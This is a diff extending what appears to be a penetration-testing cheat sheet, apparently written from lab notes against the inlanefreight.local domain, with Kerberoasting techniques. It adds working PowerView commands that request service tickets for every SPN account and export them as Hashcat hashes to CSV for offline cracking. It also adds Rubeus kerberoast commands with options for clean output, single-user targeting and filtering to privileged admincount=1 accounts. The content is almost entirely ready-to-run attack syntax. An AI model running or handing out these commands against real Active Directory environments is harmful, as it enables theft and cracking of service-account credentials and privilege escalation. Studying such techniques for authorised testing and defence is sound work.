@@ -1288,6 +1288,8 @@ Example
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
 ```
 
+---
+
 ### Kerberoasting — Bulk TGS request using setspn + PowerShell
 Kerberoasting — Bulk TGS request using setspn + PowerShell
 Purpose
@@ -1304,3 +1306,65 @@ Select-String '^CN' -Context 0,1 |
 % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
 
+---
+
+## Kerberoasting (Windows) — Exporting TGS hashes to CSV (PowerView)
+
+### Purpose
+Enumerate all SPN-enabled users, request their Kerberos service tickets (TGS), and export them in Hashcat format to a CSV file for offline cracking.
+
+### Syntax
+```powershell
+Get-DomainUser * -SPN |
+Get-DomainSPNTicket -Format Hashcat |
+Export-Csv <output_file> -NoTypeInformation
+```
+Example
+```powershell
+Get-DomainUser * -SPN |
+Get-DomainSPNTicket -Format Hashcat |
+Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+
+---
+
+## Kerberoasting (Windows) — Using Rubeus
+
+### Purpose
+Automate Kerberoasting from a Windows host and control ticket format, encryption type, scope, and output cleanliness.
+
+---
+
+## Rubeus — Basic Kerberoast
+
+### Syntax
+```powershell
+Rubeus.exe kerberoast
+```
+
+---
+
+### Rubeus — Clean output for offline cracking
+Purpose
+Prevent Base64 wrapping and formatting issues when copying hashes.
+```powershell
+Rubeus.exe kerberoast /nowrap
+```
+### Rubeus — Target a specific user
+```powershell
+Rubeus.exe kerberoast /user:<username> /nowrap
+```
+
+### Rubeus — Filter high-value targets
+Purpose
+Only request tickets for privileged or sensitive accounts.
+```powershell
+Rubeus.exe kerberoast /ldapfilter:'<filter>' /nowrap
+```
+Example
+```powershell
+Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+Notes
+* admincount=1 indicates protected or privileged accounts.
+* Reduces noise and focuses on high-impact targets.
